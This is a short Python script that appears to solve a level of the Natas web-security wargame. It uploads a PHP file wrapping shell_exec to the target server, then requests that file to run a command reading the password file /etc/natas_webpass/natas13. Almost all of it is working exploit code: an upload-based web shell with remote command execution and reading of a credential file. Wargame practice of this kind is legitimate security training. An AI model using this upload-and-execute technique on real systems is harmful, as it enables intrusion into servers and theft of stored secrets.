from natas import Natas
import io


natas = Natas('natas12')

offset = b'0'
length = b'0'
filename = b'/etc/natas_webpass/natas13'

payload = b'''
echo $((0x$(xxd -p -s 0 -l 1 /etc/natas_webpass/natas13)))
'''

script = b'''
    $output = shell_exec("'''+payload+b''' 2>&1");
    print $output;
'''

f = io.BytesIO(b'<?php\n' + script)  # execute any script on the server

post = {'filename': 'dupa.php'}
files = {'uploadedfile': f}

resp = natas.get_response(data=post, files=files)

href = resp.a.get('href')

resp = natas.get_response(relative_url=href)

print(resp)
